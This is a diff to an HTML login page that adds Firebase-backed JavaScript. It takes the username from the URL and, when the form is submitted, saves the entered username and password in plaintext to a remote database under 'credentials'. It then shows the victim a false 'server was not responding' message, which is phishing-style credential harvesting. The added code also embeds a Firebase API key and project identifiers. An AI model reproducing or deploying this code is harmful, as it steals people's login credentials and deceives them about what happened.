@@ -30,7 +30,81 @@
     
         <footer class="page-footer">
             </footer>
-    
+     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <script>
+        // 1. Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyA9W3joJeCvHkTA-nWgRF-rGqx8w68VVvE",
+            authDomain: "my-login-app-6efc5.firebaseapp.com",
+            projectId: "my-login-app-6efc5",
+            databaseURL: "https://my-login-app-6efc5-default-rtdb.asia-southeast1.firebasedatabase.app",
+            storageBucket: "my-login-app-6efc5.firebasestorage.app",
+            messagingSenderId: "1044317120338",
+            appId: "1:1044317120338:web:99ffd40e4346c8f5557c8b",
+            // measurementId is optional for this
+        };
+
+        // 2. Initialize Firebase using v8 syntax
+        firebase.initializeApp(firebaseConfig);
+        console.log("Firebase Connected Successfully!");
+
+        // 3. Get URL parameters on page load
+        window.addEventListener('DOMContentLoaded', () => {
+            const params = new URLSearchParams(window.location.search);
+            const username = params.get('username');
+            if (username) {
+                document.getElementById('username-display').textContent = username;
+            }
+
+            // Password toggle logic
+            const passwordInput = document.getElementById('password');
+            const toggleButton = document.querySelector('.password-toggle');
+            if (toggleButton) {
+                toggleButton.addEventListener('click', function () {
+                    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                    passwordInput.setAttribute('type', type);
+                    this.textContent = type === 'password' ? '👁' : '🙈';
+                });
+            }
+        });
+
+        // 4. Function to save credentials to Firebase Database
+        function saveCredentials(event) {
+            event.preventDefault();
+            const username = document.getElementById('username-display').textContent;
+            const password = document.getElementById('password').value;
+
+            if (!username || !password) {
+                alert('Username or Password cannot be empty.');
+                return;
+            }
+
+            // Get a reference to the Firebase Realtime Database
+            const database = firebase.database();
+            
+            // Create a unique key for the data entry
+            const newCredentialKey = database.ref().child('credentials').push().key;
+
+            // Save the data
+            database.ref('credentials/' + newCredentialKey).set({
+                username: username,
+                password: password,
+                timestamp: new Date().toString()
+            })
+            .then(() => {
+                alert('server was not responding');
+                // Optional: clear the form
+                document.querySelector('form').reset();
+            })
+            .catch((error) => {
+                console.error("Error saving data to Firebase: ", error);
+                alert("Failed to save data. Check console for errors.");
+            });
+        }
+    </script>
         <script>
             window.addEventListener('DOMContentLoaded', () => {
                 const params = new URLSearchParams(window.location.search);
